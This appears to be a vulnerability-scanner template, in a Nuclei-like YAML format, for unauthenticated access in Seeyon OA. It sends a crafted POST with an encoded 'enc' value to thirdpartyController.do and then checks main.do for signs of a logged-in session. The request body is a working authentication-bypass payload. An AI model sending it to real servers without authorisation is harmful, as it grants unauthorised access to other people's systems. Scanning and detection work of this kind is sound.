id: seeyon-unauth
brief:
    title: Seeyon Unauthorised Access
    by: pikpikcu
    level: high
    about: Seeyon is vulnerable to unauthorised access.
    label:
        - misconfig
        - seeyon
        - unauth
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/seeyon/thirdpartyController.do'
      head:
        Accept-Encoding: deflate
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
      body: method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4
      signs:
        - "on": word
          has:
            - 当前已登录了一个用户，同一窗口中不能登录多个用户
            - <a href='/seeyon/main.do?method=logout'
          in: body
          need: all
        - "on": status
          status:
            - 200
    - verb: GET
      to:
        - '{{BaseURL}}/seeyon/main.do'
      head:
        Accept-Encoding: deflate
        Content-Type: application/x-www-form-urlencoded
        Cookie: '{{session}}'
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
      signs:
        - "on": word
          has:
            - 当前已登录了一个用户，同一窗口中不能登录多个用户
            - <a href='/seeyon/main.do?method=logout'
          in: body
          need: all
        - "on": status
          status:
            - 200
